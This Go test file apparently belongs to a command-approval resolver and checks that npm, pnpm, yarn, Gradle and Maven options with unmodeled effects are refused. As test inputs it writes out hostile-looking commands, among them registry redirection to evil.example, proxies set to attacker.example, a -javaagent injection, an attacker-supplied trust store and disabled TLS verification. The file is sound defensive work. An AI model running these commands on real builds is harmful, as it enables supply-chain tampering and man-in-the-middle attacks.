package resolver

import (
	"strings"
	"testing"
)

// This is the standing recognizer effect-superset corpus SECURITY_AUDIT.md §4
// proposes (systemic observation 1): for each recognizer, a table of option
// combinations asserting that the modeled effects are a superset of the real
// command's effects, or that the option makes the action UNRESOLVED rather
// than under-modeled. It currently covers the package/build-tools area
// (T047, §8.2 npm/pnpm/yarn, Gradle, Maven); add rows here — or a new
// `TestXxxRecognizerEffectSuperset` in this style — as other areas get the
// same review.
//
// Rows marked AG-140…AG-143 were, before this review, rows that resolved
// instead and produced an effect set narrower than reality; they stay here so
// a future change cannot silently put the option back on a "safe" list. Rows
// without a finding id were already correctly refused and are kept as the
// "reviewed, no finding" baseline the corpus is also meant to protect.

type supersetCase struct {
	name    string
	command string

	// setup builds the workspace; nil defaults to an empty package.json,
	// which is enough for the npm/pnpm/yarn rows.
	setup func(t *testing.T) *repo

	// wantUnresolved asserts the option takes the action out of resolution
	// rather than letting it under-model the real effects.
	wantUnresolved bool
	reasonContains string

	// wantEffectsContain asserts the modeled effects are at least this list;
	// "at least" because a safe superset may model more.
	wantEffectsContain []string
	// wantEffectsExclude asserts none of these effects are present — used to
	// pin down the safe-narrowing cases (e.g. --ignore-scripts) so a
	// regression cannot silently widen them into an always-present effect
	// that would make every install indistinguishable from a risky one.
	wantEffectsExclude []string
}

func runSupersetCorpus(t *testing.T, cases []supersetCase) {
	t.Helper()
	for _, tt := range cases {
		t.Run(tt.name, func(t *testing.T) {
			setup := tt.setup
			if setup == nil {
				setup = func(t *testing.T) *repo { return nodeRepo(t, `{"scripts":{}}`) }
			}
			r := setup(t)
			out := r.resolve(t, tt.command)

			if tt.wantUnresolved {
				if out.Status.Approvable() {
					t.Fatalf("status = %s (%s), want a non-approvable status", out.Status, out.StatusReason)
				}
				if tt.reasonContains != "" && !strings.Contains(out.StatusReason, tt.reasonContains) {
					t.Errorf("reason = %q, want it to mention %q", out.StatusReason, tt.reasonContains)
				}
				return
			}

			if !out.Status.Approvable() {
				t.Fatalf("status = %s (%s), want an approvable status", out.Status, out.StatusReason)
			}
			got := actionEffects(out)
			for _, want := range tt.wantEffectsContain {
				if !containsString(got, want) {
					t.Errorf("effects = %v, want them to include %q", got, want)
				}
			}
			for _, exclude := range tt.wantEffectsExclude {
				if containsString(got, exclude) {
					t.Errorf("effects = %v, want them to exclude %q", got, exclude)
				}
			}
		})
	}
}

func TestNpmRecognizerEffectSuperset(t *testing.T) {
	scripted := func(t *testing.T) *repo {
		return nodeRepo(t, `{"scripts":{"build":"cat package.json","cleanup":"rm -rf ./dist"}}`)
	}

	runSupersetCorpus(t, []supersetCase{
		{
			name:               "a plain script resolves to its real effects",
			setup:              scripted,
			command:            "npm run cleanup",
			wantEffectsContain: []string{"DELETE(force,recursive) ./dist"},
		},
		// AG-14x: directory-redirecting flags point the manager at a
		// package.json Intenter never reads.
		{name: "npm run --prefix refuses", setup: scripted, command: "npm run build --prefix ../other", wantUnresolved: true, reasonContains: "--prefix"},
		{name: "npm run -C refuses", setup: scripted, command: "npm run build -C ../other", wantUnresolved: true, reasonContains: "-C"},
		{name: "pnpm run --dir refuses", setup: scripted, command: "pnpm run build --dir ../other", wantUnresolved: true, reasonContains: "--dir"},
		{name: "yarn run --cwd refuses", setup: scripted, command: "yarn run build --cwd ../other", wantUnresolved: true, reasonContains: "--cwd"},
		// AG-14x: config-override flags replace the .npmrc files Intenter
		// reads to decide the script-shell dialect and the registry.
		{name: "npm run --userconfig refuses", setup: scripted, command: "npm run build --userconfig /tmp/x.npmrc", wantUnresolved: true, reasonContains: "--userconfig"},
		{name: "npm run --globalconfig refuses", setup: scripted, command: "npm run build --globalconfig /tmp/x.npmrc", wantUnresolved: true, reasonContains: "--globalconfig"},
		{name: "npm run --script-shell refuses", setup: scripted, command: "npm run build --script-shell=/bin/zsh", wantUnresolved: true, reasonContains: "--script-shell"},
		{name: "npm run --registry refuses", setup: scripted, command: "npm run build --registry=http://evil.example", wantUnresolved: true, reasonContains: "--registry"},
		// Already-modeled workspace-selecting flags (regression baseline).
		{name: "npm run --workspace refuses", setup: scripted, command: "npm run build --workspace=api", wantUnresolved: true, reasonContains: "--workspace"},
		{name: "pnpm run --filter refuses", setup: scripted, command: "pnpm run build --filter api", wantUnresolved: true, reasonContains: "--filter"},

		// AG-14x: an install without --ignore-scripts runs the lifecycle
		// scripts of every installed package, which is arbitrary code; the
		// action must not resolve to only the declared node_modules/lockfile
		// writes.
		{
			name:           "npm install without --ignore-scripts refuses",
			command:        "npm install",
			wantUnresolved: true,
			reasonContains: "lifecycle",
		},
		{
			name:               "npm install --ignore-scripts narrows to no lifecycle execution",
			command:            "npm install --ignore-scripts",
			wantEffectsContain: []string{"CREATE(recursive) ./node_modules"},
			wantEffectsExclude: []string{"EXECUTE program:UNRESOLVED"},
		},
		// AG-14x: npmInstall did not check the workspace-, directory- or
		// config-redirecting flags npmRunScript already refused.
		{name: "npm install --prefix refuses", command: "npm install --prefix ../other", wantUnresolved: true, reasonContains: "--prefix"},
		{name: "npm install --workspace refuses", command: "npm install --workspace=other", wantUnresolved: true, reasonContains: "--workspace"},
		{name: "npm install --registry refuses", command: "npm install --registry=http://evil.example", wantUnresolved: true, reasonContains: "--registry"},

		// AG-14x: npx must refuse an unmodeled leading flag rather than
		// silently drop it, and must never strip arguments meant for the
		// invoked program.
		{
			name: "npx of a remote package refuses (would download)",
			setup: func(t *testing.T) *repo {
				return nodeRepo(t, `{"scripts":{}}`)
			},
			command:        "npx create-react-app my-app",
			wantUnresolved: true,
			reasonContains: "download",
		},
		{
			name:           "npx unmodeled leading flag refuses",
			setup:          npxRimrafRepo,
			command:        "npx --prefix /tmp/evil rimraf ./dist",
			wantUnresolved: true,
			reasonContains: "--prefix",
		},
		{
			name:           "npx keeps arguments after the package name, letting the child grammar refuse them",
			setup:          npxRimrafRepo,
			command:        "npx rimraf --an-unknown-flag ./dist",
			wantUnresolved: true,
			reasonContains: "--an-unknown-flag",
		},

		// AG-14x, critical: a yarnPath override in .yarnrc.yml means every
		// `yarn` invocation runs a project-supplied implementation Intenter
		// cannot inspect, however read-only the script text looks.
		{
			name: "yarnPath override refuses even a read-only-looking script",
			setup: func(t *testing.T) *repo {
				r := nodeRepo(t, `{"scripts":{"test":"cat package.json"}}`)
				r.write(t, ".yarnrc.yml", "yarnPath: .yarn/releases/yarn-3.6.1.cjs\n")
				return r
			},
			command:        "yarn test",
			wantUnresolved: true,
			reasonContains: ".yarn/releases/yarn-3.6.1.cjs",
		},

		// AG-144, critical: a .pnpmfile.cjs's readPackage/afterAllResolved
		// hooks run during dependency resolution regardless of
		// --ignore-scripts, unlike the installed packages' own lifecycle
		// scripts, so the flag must not narrow a pnpm install to "no
		// execution" when a pnpmfile is present.
		{
			name: "pnpm install --ignore-scripts still refuses when a pnpmfile is present",
			setup: func(t *testing.T) *repo {
				r := nodeRepo(t, `{"scripts":{}}`)
				r.write(t, ".pnpmfile.cjs", "module.exports = { hooks: { readPackage() {} } }\n")
				return r
			},
			command:        "pnpm install --ignore-scripts",
			wantUnresolved: true,
			reasonContains: ".pnpmfile.cjs",
		},
		{
			name: "pnpm run refuses when a pnpmfile is present, even a read-only-looking script",
			setup: func(t *testing.T) *repo {
				r := nodeRepo(t, `{"scripts":{"build":"cat package.json"}}`)
				r.write(t, ".pnpmfile.cjs", "module.exports = {}\n")
				return r
			},
			command:        "pnpm run build",
			wantUnresolved: true,
			reasonContains: ".pnpmfile.cjs",
		},
	})
}

// npxRimrafRepo is a workspace with a locally installed rimraf shim, the
// precondition for npx to resolve at all instead of refusing as a download.
func npxRimrafRepo(t *testing.T) *repo {
	r := nodeRepo(t, `{"scripts":{}}`)
	npxRimraf(t, r)
	return r
}

func TestGradleRecognizerEffectSuperset(t *testing.T) {
	runSupersetCorpus(t, []supersetCase{
		{
			name:    "a plain test task declares the build envelope",
			setup:   func(t *testing.T) *repo { return gradleRepo(t) },
			command: "./gradlew test",
			wantEffectsContain: []string{
				"READ(recursive) .",
				"CREATE(recursive) ./build",
				"WRITE(recursive) ./build",
				"READ(recursive) ~/.gradle",
				"WRITE(recursive) ~/.gradle",
				"NETWORK declared:dependency-registry",
				"EXECUTE program:DECLARED",
			},
		},
		// Already-refused option grammar (regression baseline): none of these
		// is on any "safe" list, so an unmodeled global config or property
		// override cannot silently ride along with an approved run.
		{name: "-I/--init-script refuses", setup: func(t *testing.T) *repo { return gradleRepo(t) }, command: "./gradlew -I init.gradle test", wantUnresolved: true, reasonContains: "-I"},
		{name: "-p project-dir refuses", setup: func(t *testing.T) *repo { return gradleRepo(t) }, command: "./gradlew -p ../other test", wantUnresolved: true, reasonContains: "-p"},
		{name: "-b build-file refuses", setup: func(t *testing.T) *repo { return gradleRepo(t) }, command: "./gradlew -b other.gradle test", wantUnresolved: true, reasonContains: "-b"},
		{name: "--gradle-user-home refuses", setup: func(t *testing.T) *repo { return gradleRepo(t) }, command: "./gradlew --gradle-user-home /tmp/g test", wantUnresolved: true, reasonContains: "--gradle-user-home"},
		{name: "-Dorg.gradle.jvmargs refuses (would inject -javaagent)", setup: func(t *testing.T) *repo { return gradleRepo(t) }, command: "./gradlew test -Dorg.gradle.jvmargs=-javaagent:/tmp/e.jar", wantUnresolved: true, reasonContains: "-Dorg.gradle.jvmargs"},
		{name: "-Duser.home refuses", setup: func(t *testing.T) *repo { return gradleRepo(t) }, command: "./gradlew test -Duser.home=/tmp", wantUnresolved: true, reasonContains: "-Duser.home"},
		{name: "publishing refuses", setup: func(t *testing.T) *repo { return gradleRepo(t) }, command: "./gradlew publish", wantUnresolved: true, reasonContains: "publish"},

		// AG-145: the standard Java proxy and TLS-trust-store properties
		// silently redirect or MITM the "dependency-registry" network effect
		// an approval was granted against, without changing the fingerprint.
		{name: "-Dhttps.proxyHost refuses (would redirect dependency downloads)", setup: func(t *testing.T) *repo { return gradleRepo(t) }, command: "./gradlew test -Dhttps.proxyHost=attacker.example", wantUnresolved: true, reasonContains: "-Dhttps.proxyHost"},
		{name: "-Dhttp.proxyHost refuses", setup: func(t *testing.T) *repo { return gradleRepo(t) }, command: "./gradlew test -Dhttp.proxyHost=attacker.example", wantUnresolved: true, reasonContains: "-Dhttp.proxyHost"},
		{name: "-Djavax.net.ssl.trustStore refuses (would defeat TLS verification)", setup: func(t *testing.T) *repo { return gradleRepo(t) }, command: "./gradlew test -Djavax.net.ssl.trustStore=/tmp/evil.jks", wantUnresolved: true, reasonContains: "-Djavax.net.ssl.trustStore"},

		// AG-147: an included build (composite build) is a second Gradle
		// project, evaluated and built with its own arbitrary build script,
		// whose directory is outside both the declared read/write envelope
		// and GradleConfigFingerprint's file set.
		{
			name: "settings.gradle declaring includeBuild refuses",
			setup: func(t *testing.T) *repo {
				r := gradleRepo(t)
				r.write(t, "settings.gradle.kts", `rootProject.name = "demo"`+"\n"+`includeBuild("../shared-lib")`)
				return r
			},
			command:        "./gradlew test",
			wantUnresolved: true,
			reasonContains: "includeBuild",
		},
	})
}

func TestMavenRecognizerEffectSuperset(t *testing.T) {
	runSupersetCorpus(t, []supersetCase{
		{
			name:    "a plain test goal declares the build envelope",
			setup:   func(t *testing.T) *repo { return mavenRepo(t) },
			command: "mvn test",
			wantEffectsContain: []string{
				"READ(recursive) .",
				"CREATE(recursive) ./target",
				"WRITE(recursive) ./target",
				"READ(recursive) ~/.m2",
				"NETWORK declared:dependency-registry",
				"EXECUTE program:DECLARED",
			},
			wantEffectsExclude: []string{"WRITE(recursive) ~/.m2"},
		},
		// Already-refused option grammar and plugin goals (regression
		// baseline): a direct arbitrary-code-execution plugin goal is not on
		// any recognized-goal list, so it stays unresolved rather than being
		// guessed at as build-tool info.
		{name: "-s/--settings refuses", setup: func(t *testing.T) *repo { return mavenRepo(t) }, command: "mvn -s custom-settings.xml test", wantUnresolved: true, reasonContains: "-s"},
		{name: "-f/--file refuses", setup: func(t *testing.T) *repo { return mavenRepo(t) }, command: "mvn -f other/pom.xml test", wantUnresolved: true, reasonContains: "-f"},
		{name: "-t/--toolchains refuses", setup: func(t *testing.T) *repo { return mavenRepo(t) }, command: "mvn -t toolchains.xml test", wantUnresolved: true, reasonContains: "-t"},
		{name: "-Dmaven.repo.local refuses", setup: func(t *testing.T) *repo { return mavenRepo(t) }, command: "mvn test -Dmaven.repo.local=/tmp/repo", wantUnresolved: true, reasonContains: "-Dmaven.repo.local"},
		{name: "exec:java plugin goal refuses (arbitrary code)", setup: func(t *testing.T) *repo { return mavenRepo(t) }, command: "mvn exec:java", wantUnresolved: true, reasonContains: "exec:java"},
		{name: "antrun:run plugin goal refuses (arbitrary code)", setup: func(t *testing.T) *repo { return mavenRepo(t) }, command: "mvn antrun:run", wantUnresolved: true, reasonContains: "antrun:run"},
		{name: "deploy refuses", setup: func(t *testing.T) *repo { return mavenRepo(t) }, command: "mvn deploy", wantUnresolved: true, reasonContains: "deploy"},

		// AG-146: the standard Java proxy properties and Maven's wagon
		// insecure-TLS properties silently redirect or defeat certificate
		// validation for the "dependency-registry" network effect an
		// approval was granted against, without changing the fingerprint —
		// the well-known way to make Maven accept a MITM'd artifact.
		{name: "-Dhttps.proxyHost refuses (would redirect dependency downloads)", setup: func(t *testing.T) *repo { return mavenRepo(t) }, command: "mvn test -Dhttps.proxyHost=attacker.example", wantUnresolved: true, reasonContains: "-Dhttps.proxyHost"},
		{name: "-Dmaven.wagon.http.ssl.insecure refuses (disables TLS verification)", setup: func(t *testing.T) *repo { return mavenRepo(t) }, command: "mvn test -Dmaven.wagon.http.ssl.insecure=true", wantUnresolved: true, reasonContains: "-Dmaven.wagon.http.ssl.insecure"},
		{name: "-Dmaven.wagon.http.ssl.allowall refuses (disables TLS verification)", setup: func(t *testing.T) *repo { return mavenRepo(t) }, command: "mvn test -Dmaven.wagon.http.ssl.allowall=true", wantUnresolved: true, reasonContains: "-Dmaven.wagon.http.ssl.allowall"},
	})
}
